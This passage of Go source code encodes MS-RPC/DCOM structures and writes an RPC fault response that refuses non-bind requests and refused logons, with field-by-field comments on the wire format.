	out = bo.AppendUint16(out, rpcComVersionMinor)
	out = bo.AppendUint32(out, rpcReferentID)     // ppdsaOrBindings referent
	out = bo.AppendUint32(out, uint32(len(arr)))  // conformant max_count
	out = bo.AppendUint16(out, uint16(len(arr)))  // wNumEntries
	out = bo.AppendUint16(out, uint16(secOffset)) // wSecurityOffset
	for _, v := range arr {
		out = bo.AppendUint16(out, v)
	}
	for len(out)%4 != 0 {
		out = append(out, 0) // align pReserved, which is four bytes wide
	}
	out = bo.AppendUint32(out, 0) // pReserved: MUST be zero
	return bo.AppendUint32(out, 0)
}

// msrpcWriteFault refuses anything that is not a bind, and reports a refused
// logon. PFC_DID_NOT_EXECUTE tells the client nothing ran on its behalf.
func msrpcWriteFault(conn net.Conn, pdu *msrpcPDU, status uint32) {
	body := make([]byte, 16)
	pdu.bo.PutUint32(body[0:4], 0) // alloc_hint
	pdu.bo.PutUint16(body[4:6], 0) // p_cont_id
	body[6] = 0                    // cancel_count
	body[7] = 0                    // reserved
	pdu.bo.PutUint32(body[8:12], status)
	out := msrpcHeader(pdu, rpcPktFault,
		rpcFlagFirstFrag|rpcFlagLastFrag|rpcFlagDidNotRun, 16+len(body), 0)
	conn.Write(append(out, body...))
}
